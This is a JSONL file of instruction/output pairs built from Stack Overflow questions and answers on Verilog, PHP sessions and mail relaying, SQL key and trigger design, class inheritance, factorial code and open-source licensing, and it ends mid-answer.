{"instruction": "What does it mean if a task is declared with the automatic keyword in Verilog?\ntask automatic do_things;\n  input [31:0] number_of_things;\n  reg [31:0] tmp_thing;\n  begin\n    // ...\n  end\nendtask;\n\nNote: This question is mostly because I'm curious if there are any hardware programmers on the site. :)", "output": "The \"automatic\" keyword also allows you to write recursive functions (since verilog 2001). I believe they should be synthesisable if they bottom out, but I'm not sure if they have tool support.  \nI too, do verilog!"}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "You could also set a cookie on the user-side and then check for the presence of that cookie directly after redirecting, which if you're bothered about friendly URLs would mean that you don't have to pass around a PHPSESSID in the query string."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "This method is basically from David Marr's  book \"Vision\"\nGaussian blur your signal with the expected width of your peaks.\nthis gets rid of noise spikes and your phase data is undamaged.\nThen edge detect (LOG will do)\nThen your edges were the edges of features (like peaks).\nlook between edges  for peaks, sort peaks by size, and you're done.\nI have used variations on this and they work very well."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Scheme : Functional - Tail Recursive\n(define (factorial n)\n  (define (fac-times n acc)\n    (if (= n 0)\n        acc\n        (fac-times (- n 1) (* acc n))))\n  (if (< n 0)\n      (display \"Wrong argument!\")\n      (fac-times n 1)))"}
{"instruction": "Feel free to edit the title if you know how to formulate the question better. (Tagging is a problem as well.) The problem may be too difficult in this general form, so let us consider a concrete example.\nYou get a screenful of stackoverflow questions by requesting /questions ?sort=newest page. Next page link leads to /questions?page=2 &sort=newest. I suppose that at server side, the request is translated into an SQL query with LIMIT clause. Problem with this approach is, that if new question were added while user browses first page, his second page will start with some questions he already saw. (If he has 10 question per page, and 10 new questions happened to be added, he\u2019ll get exactly the same content second time!)\nIs there an elegant way to solve this common problem? I realize that it is not that big a problem, at least not for stackoverflow, but still.\nThe best idea I have (apart from storing request history per client) is to use /questions?answer_id=NNN format. Server returns a page that starts with the requested answer, and puts the id of the first answer on the next page into next page link. There must be a way to write SQL for that, right? \nIs it how it usually done? Or there is a better way?", "output": "Most web sites I've seen don't solve this problem - they show you a page including some content you've already seen.\nYou might consider that a feature - when you click \"next\" and see some content you're seen before, it's a signal that you want to go back to the front again because there's some new content."}
{"instruction": "Feel free to edit the title if you know how to formulate the question better. (Tagging is a problem as well.) The problem may be too difficult in this general form, so let us consider a concrete example.\nYou get a screenful of stackoverflow questions by requesting /questions ?sort=newest page. Next page link leads to /questions?page=2 &sort=newest. I suppose that at server side, the request is translated into an SQL query with LIMIT clause. Problem with this approach is, that if new question were added while user browses first page, his second page will start with some questions he already saw. (If he has 10 question per page, and 10 new questions happened to be added, he\u2019ll get exactly the same content second time!)\nIs there an elegant way to solve this common problem? I realize that it is not that big a problem, at least not for stackoverflow, but still.\nThe best idea I have (apart from storing request history per client) is to use /questions?answer_id=NNN format. Server returns a page that starts with the requested answer, and puts the id of the first answer on the next page into next page link. There must be a way to write SQL for that, right? \nIs it how it usually done? Or there is a better way?", "output": "Tag each question with its time entered into the database, carry the time the frontpage was last loaded as a cookie or part of the URL, and limit the search to items n through n+displaynum as you go forward.\nBut I wouldn't bother. This behavior is uniform enough that most users expect it, and it serves as a flag for when new data is becoming available. You can even open a new tab/window that starts back at the top of the list to see what has come up."}
{"instruction": "Ok, so, my visual studio is broken. I say this NOT prematurely, as it was my first response to see where I had messed up in my code. When I add controls to the page I can't reference all of them in the code behind. Some of them I can, it seems that the first few I put on a page work, then it just stops. \nI first thought it may be the type of control as initially I was trying to reference a repeater inside an update panel. I know I am correctly referencing the code behind in my aspx page. But just in case it was a  screw up on my part I started to recreate the page from scratch and this time got a few more controls down before VS stopped recognizing my controls.\nAfter creating my page twice and getting stuck I thought maybe it was still the type of controls. I created a new page and just threw some labels on it. No dice, build fails when referencing the control from the code behind. \nIn a possibly unrelated note when I switch to the dreaded \"design\" mode of the aspx pages VS 2008 errors out and restarts. \nI have already put a trouble ticket in to Microsoft. I uninstalled all add-ins, I reinstalled visual studio. \nAnyone that wants to see my code just ask, but I am using the straight WYSIWYG visual studio \"new aspx page\" nothing fancy.\nI doubt anyone has run into this, but have you? \nHas anyone had success trouble shooting these things with Microsoft? Any way to expedite this ticket without paying??? I have been talking to a rep from Microsoft for days with no luck yet and I am dead in the water. \nThank you. \n\nJon Limjap: I edited the title to both make it clear and descriptive and make sure that nobody sees it as offensive. \"Foo-barred\" doesn't exactly constitute a proper question title, although your question is clearly a valid one.", "output": "Is the control that you are trying to reference inside of the repeater?\nIf so then you need to look them up using the FindControl method.\nFor example for:\n<asp:Repeater ID=\"Repeater1\" runat=\"server\">\n    <ItemTemplate>\n        <asp:LinkButton ID=\"LinkButton1\" runat=\"server\">stest</asp:LinkButton>\n    </ItemTemplate>\n</asp:Repeater>\n\nYou would need to do this to reference it:\nLinkButton lb = Repeater1.FindControl(\"LinkButton1\");"}
{"instruction": "Ok, so, my visual studio is broken. I say this NOT prematurely, as it was my first response to see where I had messed up in my code. When I add controls to the page I can't reference all of them in the code behind. Some of them I can, it seems that the first few I put on a page work, then it just stops. \nI first thought it may be the type of control as initially I was trying to reference a repeater inside an update panel. I know I am correctly referencing the code behind in my aspx page. But just in case it was a  screw up on my part I started to recreate the page from scratch and this time got a few more controls down before VS stopped recognizing my controls.\nAfter creating my page twice and getting stuck I thought maybe it was still the type of controls. I created a new page and just threw some labels on it. No dice, build fails when referencing the control from the code behind. \nIn a possibly unrelated note when I switch to the dreaded \"design\" mode of the aspx pages VS 2008 errors out and restarts. \nI have already put a trouble ticket in to Microsoft. I uninstalled all add-ins, I reinstalled visual studio. \nAnyone that wants to see my code just ask, but I am using the straight WYSIWYG visual studio \"new aspx page\" nothing fancy.\nI doubt anyone has run into this, but have you? \nHas anyone had success trouble shooting these things with Microsoft? Any way to expedite this ticket without paying??? I have been talking to a rep from Microsoft for days with no luck yet and I am dead in the water. \nThank you. \n\nJon Limjap: I edited the title to both make it clear and descriptive and make sure that nobody sees it as offensive. \"Foo-barred\" doesn't exactly constitute a proper question title, although your question is clearly a valid one.", "output": "try clearing your local VS cache. find your project and delete the folder. the folder is created by VS for what reason I honestly don't understand. but I've had several occasions where clearing it and doing a re-build fixes things... hope this is all that you need as well.\nhere\n%Temp%\\VWDWebCache\n\nand possibly here\n%LocalAppData%\\Microsoft\\WebsiteCache"}
{"instruction": "What's the best way to convert a string to an enumeration value in C#?\nI have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.\nIn an ideal world, I could do something like this:\nStatusEnum MyStatus = StatusEnum.Parse(\"Active\");\n\nbut that isn't valid code.", "output": "Note that the performance of Enum.Parse() is awful, because it is implemented via reflection. (The same is true of Enum.ToString, which goes the other way.) \nIf you need to convert strings to Enums in performance-sensitive code, your best bet is to create a Dictionary<String,YourEnum> at startup and use that to do your conversions."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Batch (NT):\n@echo off\n\nset n=%1\nset result=1\n\nfor /l %%i in (%n%, -1, 1) do (\n    set /a result=result * %%i\n)\n\necho %result%\n\nUsage: \nC:>factorial.bat 15"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Haskell : Functional - Tail Recursive\nfactorial n = factorial' n 1\n\nfactorial' 0 a = a\nfactorial' n a = factorial' (n-1) (n*a)"}
{"instruction": "I'm looking to push my domain model into a WCF Service API and wanted to get some thoughts on lazy loading techniques with this type of setup.\nAny suggestions when taking this approach?\n\nwhen I implemented this technique and step into my app, just before the server returns my list it hits the get of each property that is supposed to be lazy loaded ... Thus eager loading. Could you explain this issue or suggest a resolution?\nEdit:  It appears you can use the XMLIgnore attribute so it doesn\u2019t get looked at during serialization .. still reading up on this though", "output": "Don't do lazy loading over a service interface.  Define explicit DTO's and consume those as your data contracts in WCF.\nYou can use NHibernate (or other ORMs) to properly fetch the objects you need to construct the DTOs."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "When people arrive @ www.mysmallwebsite.com I would just redirect to http://www.myIsv.com/myWebSite/\n<?php header('Location: http://www.myIsv.com/myWebSite/'); ?>\n\nThis is all I would have in www.mysmqllwebsite.com/index.php\nThis way you dont have to worry about browsedr compatibility, or weather the sessions work, just do the redirct, and you'll be good."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Agda 2: Functional, dependently typed.\ndata Nat = zero | suc (m::Nat)\n\nadd (m::Nat) (n::Nat) :: Nat\n = case m of\n     (zero ) -> n\n     (suc p) -> suc (add p n)\n\nmul (m::Nat) (n::Nat)::Nat\n   = case m of\n      (zero ) -> zero\n      (suc p) -> add n (mul p n)\n\nfactorial (n::Nat)::Nat \n = case n of\n    (zero ) -> suc zero\n    (suc p) -> mul n (factorial p)"}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "I don't like either one. What happens when someone is both a member and an employee?"}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "The question is simply answered by recognising that inheritance models an \"IS-A\" relationship, while membership models a \"HAS-A\" relationship.\n\nAn employee IS A user\nAn employee HAS A userinfo\n\nWhich one is correct? This is your answer."}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "Neither one is good. Too much mutable state. You should not be able to construct an instance of a class that is in an invalid or partially initialized state.\nThat said, the second one is better because it favours composition over inheritance."}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "Ask yourself the following:\n\nDo you want to model an Employee IS a User?  If so, chose inheritance.\nDo you want to model an Employee HAS a User information?  If so, use composition.\nAre virtual functions involved between the User (info) and the Employee?  If so, use inheritance.\nCan an Employee have multiple instances of User (info)?  If so, use composition.\nDoes it make sense to assign an Employee object to a User (info) object?  If so, use inheritance.\n\nIn general, strive to model the reality your program simulates, under the constraints of code complexity and required efficiency."}
{"instruction": "I'm working on mac OS x 10.4. I have a subversion repository stored on an external drive connected via USB. I created a new python project in Eclipse (using the PyDev plugin). When I use right click Team->Share Project to set up a new prject with subversion, I get the following error:\nError while creating module: org.tigris.subversion.javahl.ClientException: Couldn't open a repository\nsvn:  Unable to open ra_local session to URL\nsvn: Unable to open repository 'file:///Volumes/svn-repos/Palindrome/Palindrome'\nThe subversion repository has the following permisions:\ndrwxrwxrwx     9 cameronl  cameronl   306 Aug 23 10:08 svn-repos\nThe external drive is formatted as Mac OS extended.\nI'm completely stumped. Anybody have any suggestions?", "output": "The key to your problem is in the error \"Unable to open ra_local session to URL\". Google it up and you'll find tons of discussions about it."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "Since each User-Widget combination is unique, you should represent that in your table by making the combination unique. In other words, go with option 2. Otherwise you may have two entries with the same widget and user IDs but different user-widget IDs."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "You only have one primary key in either case. The second one is what's called a compound key. There's no good reason for introducing a new column. In practise, you will have to keep a unique index on all candidate keys. Adding a new column buys you nothing but maintenance overhead.\nGo with option 2."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "The userwidgetid in the first table is not needed, as like you said the uniqueness comes from the combination of the widgetid and the userid.\nI would use the second table, keep the foriegn keys and add a unique index on widgetid and userid.\nSo: \n\nuserwidgets( widgetid(fk), userid(fk),\n             unique_index(widgetid, userid)\n)\n\nThere is some preformance gain in not having the extra primary key, as the database would not need to calculate the index for the key. In the above model though this index (through the unique_index) is still calculated, but I believe that this is easier to understand."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "What is the benefit of a primary key in this scenario? Consider the option of no primary key:\n  UserWidgets3: WidgetID (FK), UserID (FK)\nIf you want uniqueness then use either the compound key (UserWidgets2) or a uniqueness constraint.\nThe usual performance advantage of having a primary key is that you often query the table by the primary key, which is fast. In the case of many-to-many tables you don't usually query by the primary key so there is no performance benefit. Many-to-many tables are queried by their foreign keys, so you should consider adding indexes on WidgetID and UserID."}
{"instruction": "Is there a way to enforce constraint checking in MSSQL only when inserting new rows?  I.e. allow the constraints to be violated when removing/updating rows?\nUpdate: I mean FK constraint.", "output": "I think your best bet is to remove the explicit constraint and add a cursor for inserts, so you can perform your checking there and raise an error if the constraint is violated."}
{"instruction": "Is there a way to enforce constraint checking in MSSQL only when inserting new rows?  I.e. allow the constraints to be violated when removing/updating rows?\nUpdate: I mean FK constraint.", "output": "You could create an INSERT TRIGGER that checks that the conditions are met. That way all updates will go straight through.\nCREATE TRIGGER employee_insupd\nON employee\nFOR INSERT\nAS\n/* Get the range of level for this job type from the jobs table. */\nDECLARE @min_lvl tinyint,\n   @max_lvl tinyint,\n   @emp_lvl tinyint,\n   @job_id smallint\nSELECT @min_lvl = min_lvl, \n   @max_lvl = max_lvl, \n   @emp_lvl = i.job_lvl,\n   @job_id = i.job_id\nFROM employee e INNER JOIN inserted i ON e.emp_id = i.emp_id \n   JOIN jobs j ON j.job_id = i.job_id\nIF (@job_id = 1) and (@emp_lvl <> 10) \nBEGIN\n   RAISERROR ('Job id 1 expects the default level of 10.', 16, 1)\n   ROLLBACK TRANSACTION\nEND\nELSE\nIF NOT (@emp_lvl BETWEEN @min_lvl AND @max_lvl)\nBEGIN\n   RAISERROR ('The level for job_id:%d should be between %d and %d.',\n      16, 1, @job_id, @min_lvl, @max_lvl)\n   ROLLBACK TRANSACTION\nEND"}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "The real questions are:\n\nWhat are the business rules and user stories behind a user? \nWhat are the business rules and user stories behind an employee? \nWhat are the business rules and user stories behind a member?\n\nThese can be three completely unrelated entities or not, and that will determine whether your first or second design will work, or if another completely different design is in order."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "I recommend the Apache License (specifically, version 2).  It is not a \u201ccopy left\u201d license and it addresses several matters that are important to established companies and their lawyers.\n\u201cCopy left\u201d is the philosophy of the free software foundation requiring anything incorporating the licensed opens source code to also be licensed as open source.  That philosophy is regarded as poison by established companies that want to keep their products proprietary.\nAside from not having \u201ccopy left\u201d provisions, the Apache license specifically addresses the grant of rights from project contributors and it expressly addresses the fact that modern companies are typically made up for more than one legal entity (for example, a parent company and its subsidiaries).  Most open source licenses don\u2019t address these points.\nWhatever license you choose, if you want your code to be \u201ccorporate friendly,\u201d in the sense that you want it to be incorporated into commercial, non-open source products, it is essential that you avoid GPL and other \u201ccopy left\u201d type licenses.  While it would be best to consult with your own lawyer before investing time or money in a project for which this is an important factor, a quick shorthand for licenses that are and are not \u201ccopy left\u201d can be found on the Free Software Foundation\u2019s website.  They identify which licenses they don\u2019t find meet their standards as \u201ccopy left.\u201d  The ones FSF rejects are most likely the ones that will be corporate friendly in this sense.\n(Although the question didn\u2019t ask this, it is worth mentioning that, with very few exceptions, even GPL and other \u201ccopy left\u201d type licenses are perfectly corporate friendly if they are only used internally by the commercial entities and not incorporated into their products.)"}
{"instruction": "Which class design is better and why?\npublic class User\n{\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee : User\n{\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member : User\n{\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}\n\nOR\npublic class User\n{\n    public String UserId;\n    public String UserName;\n    public String Password;\n    public String FirstName;\n    public String LastName;\n}\n\npublic class Employee\n{\n    public User UserInfo;\n    public String EmployeeId;\n    public String EmployeeCode;\n    public String DepartmentId;\n}\n\npublic class Member\n{\n    public User UserInfo;\n    public String MemberId;\n    public String JoinDate;\n    public String ExpiryDate;\n}", "output": "I don't think composition is always better than inheritance (just usually). If Employee and Member really are Users, and they are mutually exclusive, then the first design is better. Consider the scenario where you need to access the UserName of an Employee. Using the second design you would have: \nmyEmployee.UserInfo.UserName\n\nwhich is bad (law of Demeter), so you would refactor to:\nmyEmployee.UserName\n\nwhich requires a small method on Employee to delegate to the User object. All of which is avoided by the first design."}
{"instruction": "I have the following tables in my database that have a many-to-many relationship, which is expressed by a connecting table that has foreign keys to the primary keys of each of the main tables:\n\nWidget: WidgetID (PK), Title, Price  \nUser: UserID (PK), FirstName, LastName\n\nAssume that each User-Widget combination is unique. I can see two options for how to structure the connecting table that defines the data relationship:\n\nUserWidgets1: UserWidgetID (PK), WidgetID (FK), UserID (FK)  \nUserWidgets2: WidgetID (PK, FK), UserID (PK, FK)\n\nOption 1 has a single column for the Primary Key. However, this seems unnecessary since the only data being stored in the table is the relationship between the two primary tables, and this relationship itself can form a unique key. Thus leading to option 2, which has a two-column primary key, but loses the one-column unique identifier that option 1 has. I could also optionally add a two-column unique index (WidgetID, UserID) to the first table.\nIs there any real difference between the two performance-wise, or any reason to prefer one approach over the other for structuring the UserWidgets many-to-many table?", "output": "Option 2 is the correct answer, unless you have a really good reason to add a surrogate numeric key (which you have done in option 1).\nSurrogate numeric key columns are not 'primary keys'. Primary keys are technically one of the combination of columns that uniquely identify a record within a table. \nAnyone building a database should read this article http://it.toolbox.com/blogs/database-soup/primary-keyvil-part-i-7327 by Josh Berkus to understand the difference between surrogate numeric key columns and primary keys.\nIn my experience the only real reason to add a surrogate numeric key to your table is if your primary key is a compound key and needs to be used as a foreign key reference in another table. Only then should you even think to add an extra column to the table.\nWhenever I see a database structure where every table has an 'id' column the chances are it has been designed by someone who doesn't appreciate the relational model and it will invariably display one or more of the problems identified in Josh's article."}
{"instruction": "I'm getting this problem:\nPHP Warning: mail() [function.mail]: SMTP server response: 550 5.7.1 Unable to relay for chris.mahan@gmail.com in c:\\inetpub\\wwwroot\\mailtest.php on line 12 \n\nfrom this script:\n<?php\n$to = \"chris.mahan@gmail.com\";\n$subject = \"test\";\n$body = \"this is a test\";\n\nif (mail($to, $subject, $body)){\n    echo \"mail sent\";\n}\nelse {\n    echo \"problem\";\n}\n?>\n\nsection from php.ini on the server:\n[mail function]\n; For Win32 only.\nSMTP = server.domain.com; for Win32 only\nsmtp_port = 25\n\n; For Win32 only.\nsendmail_from = support@domain.com\n; For Unix only.  You may supply arguments as well (default: \"sendmail -t -i\").\n;sendmail_path =\n\n(note that \"server\" and \"domain\" refer accurately to the actual server and domain name)\nIn IIS, SMTP is running. Under \"Access\" tab, \"Relay\" button, the Select which computers may relay through this virtual server is set to checkbox \"only the list below\" and on the list is \"127.0.0.1(xxx.xxx.xxx.xxx)\" (x's representing actual server IP address).\nServer is running Windows Server 2003 Service Pack 2, fully patched as of 5 PM Sept 1st 2008. I assume it is running IIS7 (how to check?).\nAny ideas?\nIn reponse to Espo: This machine is hosted at a datacenter. We do not want to use a gmail account (were doing it, want to move away from that). Windows server 2003 comes with its own SMTP server.\nUpdate: Per Yaakov Ellis' advice, I dropped all relay restrictions and added the server  IP to the allowed list (using the reverse DNS button provided) and the thing started working.\nThanks to both Espo and Yaakov for helping me out.", "output": "You are using the wrong SMTP-server. If you you are only going to send emails to your gmail-account, have a look at my answer here.\nIf you also need to send email to other accounts, ask you ISP for your SMTP-details.\nEDIT: I think it is always better to use 